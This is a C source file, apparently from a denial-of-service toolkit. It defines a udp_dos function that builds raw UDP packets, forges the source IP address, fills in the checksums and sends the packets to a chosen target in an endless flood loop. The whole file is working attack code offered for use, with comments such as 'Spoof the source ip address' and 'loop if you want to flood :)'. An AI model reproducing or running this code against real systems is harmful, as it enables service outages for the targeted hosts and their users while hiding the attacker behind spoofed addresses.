#include "../../include/denial_of_service/dos_header.h"

int udp_dos (const char* source_address,const char* target_address,int PORT, const char* thread_data)
{
        //Create a raw socket of type IPPROTO
        int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
        if(s == -1)
        {
                //socket creation failed, may be because of non-root privileges
                perror("Failed to create raw socket");
                exit(1);
        }
        //Datagram to represent the packet
        char datagram[4096] , source_ip[32] , *data , *pseudogram;

        //zero out the packet buffer
        memset (datagram, 0, 4096);

        //IP header
        struct iphdr *iph = (struct iphdr *) datagram;

        //UDP header
        struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));

        struct sockaddr_in sin;
        struct pseudo_header psh;

        //Data part
        data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
        strcpy(data , thread_data);

        //some address resolution
        strcpy(source_ip , source_address);
        sin.sin_family = AF_INET;
        sin.sin_port = htons(PORT);           // Use this for server port
        sin.sin_addr.s_addr = inet_addr (target_address);

        //Fill in the IP Header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data);
        iph->id = htonl (54321);        //Id of this packet
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;         //Set to 0 before calculating checksum
        iph->saddr = inet_addr ( source_ip );   //Spoof the source ip address
        iph->daddr = sin.sin_addr.s_addr;

        //Ip checksum
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);

        //UDP header
        udph->source = htons (6666);
        udph->dest = htons (5554);                                     //Change this to server port to which ever you want to connect
        udph->len = htons(8 + strlen(data));    //tcp header size
        udph->check = 0;        //leave checksum 0 now, filled later by pseudo header

        //Now the UDP checksum using the pseudo header
        psh.source_address = inet_addr( source_ip );
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_UDP;
        psh.length = htons(sizeof(struct udphdr) + strlen(data) );

        int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
        pseudogram = malloc(psize);

        memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + strlen(data));

        udph->check = csum( (unsigned short*) pseudogram , psize);

        //loop if you want to flood :)
        while (1)
        {
                //Send the packet
                if (sendto (s, datagram, iph->tot_len , 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
                {
                        perror("sendto failed");
                }
        }

        return 0;
}
